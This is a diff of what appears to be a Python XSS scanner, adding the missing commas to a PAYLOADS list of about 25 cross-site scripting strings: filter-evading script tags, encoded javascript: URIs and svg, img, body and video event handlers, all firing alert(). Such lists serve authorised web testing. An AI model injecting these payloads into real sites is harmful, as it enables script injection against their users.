@@ -28,29 +28,29 @@ except ImportError:
 
 PAYLOADS = [
     '<script>alert(1)</script>',
-    '<<SCRIPT>alert(1);//\<</SCRIPT>'
-    '<scrscriptipt>alert(1)</scrscriptipt>'
-    '¼script¾alert(1)¼/script¾'
-    '<script>alert`1`</script>'
-    '<ScRiPt>alert(1)</sCriPt>'
-    '<img src=x onerror=&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;>'
-    '<IMG SRC="javascript:alert(1);">'
-    '<IMG SRC=JaVaScRiPt:alert(1)>'
-    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
-    '<IMG SRC="jav ascript:alert(1);">'
-    '<IMG SRC="jav&#x09;ascript:alert(1);">'
-    '<IMG SRC="jav&#x0A;ascript:alert(1);">'
-    '<IMG SRC="jav&#x0D;ascript:alert(1);">'
-    '<IMG SRC=" &#14; javascript:alert(1);">'
-    '<svg onload=alert(1)>'
-    '<svg onload=alert&#40;1&#41></svg>'
-    '<svg	onload=alert(1)><svg>'
-    '<svg/onload=alert(1)>'
-    '<svg onload=alert`1`></svg>'
-    '<svg onload=alert&lpar;1&rpar;></svg>'
-    '<body onload=alert()>'
-    '<details open ontoggle="alert()">'
-    '<video autoplay onloadstart="alert()" src=x></video>'
+    '<<SCRIPT>alert(1);//\<</SCRIPT>',
+    '<scrscriptipt>alert(1)</scrscriptipt>',
+    '¼script¾alert(1)¼/script¾',
+    '<script>alert`1`</script>',
+    '<ScRiPt>alert(1)</sCriPt>',
+    '<img src=x onerror=&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;>',
+    '<IMG SRC="javascript:alert(1);">',
+    '<IMG SRC=JaVaScRiPt:alert(1)>',
+    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
+    '<IMG SRC="jav ascript:alert(1);">',
+    '<IMG SRC="jav&#x09;ascript:alert(1);">',
+    '<IMG SRC="jav&#x0A;ascript:alert(1);">',
+    '<IMG SRC="jav&#x0D;ascript:alert(1);">',
+    '<IMG SRC=" &#14; javascript:alert(1);">',
+    '<svg onload=alert(1)>',
+    '<svg onload=alert&#40;1&#41></svg>',
+    '<svg	onload=alert(1)><svg>',
+    '<svg/onload=alert(1)>',
+    '<svg onload=alert`1`></svg>',
+    '<svg onload=alert&lpar;1&rpar;></svg>',
+    '<body onload=alert()>',
+    '<details open ontoggle="alert()">',
+    '<video autoplay onloadstart="alert()" src=x></video>',
     '<p style="animation: x;" onanimationstart="alert()">XSS</p>'
 ]
 
